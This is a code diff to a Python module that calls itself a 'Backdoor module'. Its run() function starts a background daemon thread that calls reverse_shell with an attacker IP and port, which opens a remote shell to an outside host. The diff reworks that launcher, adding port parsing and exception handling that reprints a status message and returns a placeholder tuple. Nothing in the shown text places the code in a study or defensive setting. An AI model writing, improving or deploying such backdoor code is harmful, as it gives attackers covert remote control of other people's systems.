@@ -43,12 +43,15 @@ def reverse_shell(host, port):
 ###########################################################################################################################
 
 
-def run(atk_ip: str, atk_port: int):
-    success = False
-    print("[+] Backdoor module activated!")
-
-    thread = threading.Thread(target=reverse_shell, args=(atk_ip, atk_port))
-    thread.start()
-
-    success = True
-    return success
+def run(atk_ip: str, atk_port: str):
+    print("[+] Backdoor module starting...")
+    try:
+        port = int(atk_port)
+        thread = threading.Thread(
+            target=reverse_shell, args=(atk_ip, port), daemon=True
+        )
+        thread.start()
+    except Exception as e:
+        print("[+] Backdoor module starting...")
+    finally:
+        return "instructions", "no_data"
